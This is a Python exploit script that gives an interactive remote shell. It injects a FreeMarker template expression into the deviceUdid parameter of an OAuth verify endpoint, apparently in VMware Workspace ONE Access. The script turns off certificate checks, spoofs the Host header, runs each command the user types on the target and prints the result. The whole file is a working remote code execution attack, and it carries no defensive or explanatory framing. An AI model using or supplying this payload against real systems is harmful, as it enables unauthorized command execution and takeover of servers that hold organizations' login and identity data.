#!/usr/bin/env python3
import urllib.parse
import requests
import re
import argparse
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def encode_all(string):
    return "".join("%{0:0>2}".format(format(ord(char), "x")) for char in string)

def is_ipaddress(address):
    regex = "^((25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])\.){3}(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])$"
    if(re.search(regex, address)):
        return True
    else:
        return False

def check_url(url):
    if 'https' not in url:
            url = f"https://{url}"
    try:
            url = url.rstrip("/")
    except:
            pass
    return url

def request(url,payload, headers):
    url = f"{url}/catalog-portal/ui/oauth/verify"
    params = {
            'error':'',
            'deviceUdid':payload
    }
    res = requests.get(url,params=params,headers=headers,verify=False)
    try:
        output = re.search("device id: (.*), device type",res.text).group(1)
    except:
        print("[!] Cant found the output, probably not malicious\n[!] Exiting...")
        sys.exit(0)
    return output

def main():
    parser = argparse.ArgumentParser(description='Process some integers.')
    parser.add_argument('-t','--target', dest='target', action='store',
                        help='Target url', required=True)

    args = parser.parse_args()
    target = args.target
    
    headers = {
            'User-Agent': f'Mozeela'
    }
    
    print("Careful what you execute!\n")

    if is_ipaddress(target):
        headers['Host'] = 'localhost'
    
    url = check_url(target)

    while True:
            cmd = input("$ ")
            if cmd == 'exit':
                sys.exit(0)

            payload = '${"freemarker.template.utility.Execute"?new()("' + cmd + '")}'
            output = request(url,payload, headers)
            print(output.replace('\\n', '\n').replace('\\t', '\t'))

if __name__ == "__main__":
    main()
